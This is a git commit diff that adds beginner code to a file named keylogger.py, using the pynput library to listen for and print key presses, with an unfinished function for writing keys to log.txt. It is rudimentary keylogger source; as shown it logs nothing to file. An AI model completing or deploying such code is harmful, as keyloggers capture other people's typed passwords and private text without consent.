28b040be371de90456cfe0de4a1d913da07119e4
Aditya Taksande <taksandeaditya@gmail.com>
2019-12-31 17:10:44 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,4 +2,22 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
-with Listener(on_press=onpress,on_release=onrelease)
+count = 0
+keys = []
+
+def onpress(key):
+    print("{0} pressed".format(key))
+
+def writefile():
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(key)
+
+def onrelease(key):
+    if key == Key.esc:
+        return False
+
+
+
+with Listener(on_press=onpress,on_release=onrelease) as listner:
+    listner.join()
